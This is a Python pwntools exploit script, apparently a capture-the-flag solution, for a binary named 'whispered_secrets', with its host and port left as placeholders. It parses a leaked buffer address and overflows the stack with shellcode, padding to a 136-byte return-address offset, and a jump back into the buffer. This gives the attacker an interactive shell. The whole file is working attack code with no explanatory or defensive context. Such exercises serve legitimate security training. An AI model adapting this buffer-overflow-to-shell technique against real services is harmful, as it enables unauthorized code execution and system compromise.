#!/usr/bin/env python3
from pwn import *

exe = ELF("./whispered_secrets")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 136

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── leak phase ────────────────────────────────────────────────────────────
    leak_line = r.recvline_contains(b"secret:")
    buf_addr  = int(leak_line.split(b"secret: ")[1].strip(), 16)
    log.info(f"buf = {buf_addr:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    shellcode = asm(shellcraft.sh())

    payload = flat(
        shellcode,                               # machine code at start of buf
        b'A' * (OFFSET_TO_RIP - len(shellcode)), # padding to reach RIP
        p64(buf_addr),                           # overwrite RIP → jump to shellcode
    )

    r.sendafter(b"secret:\n", payload)
    r.interactive()

if __name__ == "__main__":
    main()